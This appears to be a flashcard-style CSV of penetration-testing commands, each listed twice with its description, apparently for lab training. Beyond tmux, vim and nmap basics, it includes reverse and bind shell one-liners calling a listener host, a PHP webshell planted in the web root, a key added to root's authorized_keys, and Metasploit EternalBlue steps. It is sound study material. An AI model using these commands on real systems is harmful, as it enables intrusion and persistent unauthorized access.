"sudo openvpn user.ovpn","Connect to VPN"
"ifconfig","Show IP address"
"ip a","Show IP address"
"netstat -rn","Show routing table (networks via VPN)"
"ssh user@10.10.10.10","SSH into remote server"
"ftp 10.129.42.253","FTP to a remote server"
"tmux","Start tmux session"
"ctrl+b","tmux: default prefix key"
"prefix c","tmux: new window"
"prefix 1","tmux: switch to window 1"
"prefix shift+%","tmux: split pane vertically"
"prefix shift+""","tmux: split pane horizontally"
"prefix ->","tmux: switch to right pane"
"vim file","Open file with vim"
"esc+i","vim: enter insert mode"
"esc","vim: back to normal mode"
"x","vim: cut character"
"dw","vim: cut word"
"dd","vim: cut full line"
"yw","vim: copy word"
"yy","vim: copy full line"
"p","vim: paste"
":1","vim: go to line 1"
":w","vim: save file"
":q","vim: quit"
":q!","vim: quit without saving"
":wq","vim: save and quit"
"nmap 10.129.42.253","Run nmap on an IP"
"nmap -sV -sC -p- 10.129.42.253","Full scan with scripts"
"locate scripts/citrix","Find nmap scripts"
"nmap --script smb-os-discovery.nse -p445 10.10.10.40","Run nmap SMB script"
"netcat 10.10.10.10 22","Grab banner from port"
"smbclient -N -L \\\\10.129.42.253","List SMB shares"
"smbclient \\\\10.129.42.253\\users","Connect to SMB share"
"snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0","SNMP system name"
"onesixtyone -c dict.txt 10.129.42.254","Brute-force SNMP"
"gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt","Directory brute-force"
"gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt","Subdomain brute-force"
"curl -IL https://www.inlanefreight.com","Grab HTTP headers"
"whatweb 10.10.10.121","Fingerprint webserver"
"curl 10.10.10.121/robots.txt","Check robots.txt"
"ctrl+U","View page source (Firefox)"
"searchsploit openssh 7.2","Search public exploits"
"msfconsole","Start Metasploit"
"search exploit eternalblue","MSF: search for EternalBlue"
"use exploit/windows/smb/ms17_010_psexec","Use MSF module"
"show options","MSF: list module options"
"set RHOSTS 10.10.10.40","MSF: set target"
"check","MSF: test vulnerability"
"exploit","MSF: run exploit"
"nc -lvnp 1234","Start netcat listener"
"bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'","Reverse shell"
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f","Alt reverse shell"
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f","Bind shell"
"nc 10.10.10.1 1234","Connect to bind shell"
"python -c 'import pty; pty.spawn(\"/bin/bash\")'","Upgrade TTY shell (pty)"
"ctrl+z then stty raw -echo then fg then enter twice","Upgrade TTY (manual)"
"echo \"<?php system(\$_GET['cmd']);?>\" > /var/www/html/shell.php","Create PHP webshell"
"curl http://SERVER_IP:PORT/shell.php?cmd=id","Execute command via webshell"
"./linpeas.sh","Run linpeas"
"sudo -l","List sudo permissions"
"sudo -u user /bin/echo Hello World!","Run command as another user"
"sudo su -","Switch to root user"
"sudo su user -","Switch to another user"
"ssh-keygen -f key","Generate SSH key"
"echo \"ssh-rsa AAAA...\" >> /root/.ssh/authorized_keys","Add public key to root"
"ssh root@10.10.10.10 -i key","SSH as root with key"
"python3 -m http.server 8000","Start local HTTP server"
"wget http://10.10.14.1:8000/linpeas.sh","Download file via wget"
"curl http://10.10.14.1:8000/linenum.sh -o linenum.sh","Download file via curl"
"scp linenum.sh user@remotehost:/tmp/linenum.sh","SCP file to remote"
"base64 shell -w 0","Encode file to base64"
"echo BASE64 | base64 -d > shell","Decode base64 to file"
"md5sum shell","Check file hash"
"Connect to VPN","sudo openvpn user.ovpn"
"Show IP address","ifconfig"
"Show IP address","ip a"
"Show routing table (networks via VPN)","netstat -rn"
"SSH into remote server","ssh user@10.10.10.10"
"FTP to a remote server","ftp 10.129.42.253"
"Start tmux session","tmux"
"tmux: default prefix key","ctrl+b"
"tmux: new window","prefix c"
"tmux: switch to window 1","prefix 1"
"tmux: split pane vertically","prefix shift+%"
"tmux: split pane horizontally","prefix shift+"""
"tmux: switch to right pane","prefix ->"
"Open file with vim","vim file"
"vim: enter insert mode","esc+i"
"vim: back to normal mode","esc"
"vim: cut character","x"
"vim: cut word","dw"
"vim: cut full line","dd"
"vim: copy word","yw"
"vim: copy full line","yy"
"vim: paste","p"
"vim: go to line 1",":1"
"vim: save file",":w"
"vim: quit",":q"
"vim: quit without saving",":q!"
"vim: save and quit",":wq"
"Run nmap on an IP","nmap 10.129.42.253"
"Full scan with scripts","nmap -sV -sC -p- 10.129.42.253"
"Find nmap scripts","locate scripts/citrix"
"Run nmap SMB script","nmap --script smb-os-discovery.nse -p445 10.10.10.40"
"Grab banner from port","netcat 10.10.10.10 22"
"List SMB shares","smbclient -N -L \\\\10.129.42.253"
"Connect to SMB share","smbclient \\\\10.129.42.253\\users"
"SNMP system name","snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0"
"Brute-force SNMP","onesixtyone -c dict.txt 10.129.42.254"
"Directory brute-force","gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt"
"Subdomain brute-force","gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt"
"Grab HTTP headers","curl -IL https://www.inlanefreight.com"
"Fingerprint webserver","whatweb 10.10.10.121"
"Check robots.txt","curl 10.10.10.121/robots.txt"
"View page source (Firefox)","ctrl+U"
"Search public exploits","searchsploit openssh 7.2"
"Start Metasploit","msfconsole"
"MSF: search for EternalBlue","search exploit eternalblue"
"Use MSF module","use exploit/windows/smb/ms17_010_psexec"
"MSF: list module options","show options"
"MSF: set target","set RHOSTS 10.10.10.40"
"MSF: test vulnerability","check"
"MSF: run exploit","exploit"
"Start netcat listener","nc -lvnp 1234"
"Reverse shell","bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"
"Alt reverse shell","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f"
"Bind shell","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f"
"Connect to bind shell","nc 10.10.10.1 1234"
"Upgrade TTY shell (pty)","python -c 'import pty; pty.spawn(\"/bin/bash\")'"
"Upgrade TTY (manual)","ctrl+z then stty raw -echo then fg then enter twice"
"Create PHP webshell","echo \"<?php system(\$_GET['cmd']);?>\" > /var/www/html/shell.php"
"Execute command via webshell","curl http://SERVER_IP:PORT/shell.php?cmd=id"
"Run linpeas","./linpeas.sh"
"List sudo permissions","sudo -l"
"Run command as another user","sudo -u user /bin/echo Hello World!"
"Switch to root user","sudo su -"
"Switch to another user","sudo su user -"
"Generate SSH key","ssh-keygen -f key"
"Add public key to root","echo \"ssh-rsa AAAA...\" >> /root/.ssh/authorized_keys"
"SSH as root with key","ssh root@10.10.10.10 -i key"
"Start local HTTP server","python3 -m http.server 8000"
"Download file via wget","wget http://10.10.14.1:8000/linpeas.sh"
"Download file via curl","curl http://10.10.14.1:8000/linenum.sh -o linenum.sh"
"SCP file to remote","scp linenum.sh user@remotehost:/tmp/linenum.sh"
"Encode file to base64","base64 shell -w 0"
"Decode base64 to file","echo BASE64 | base64 -d > shell"
"Check file hash","md5sum shell"
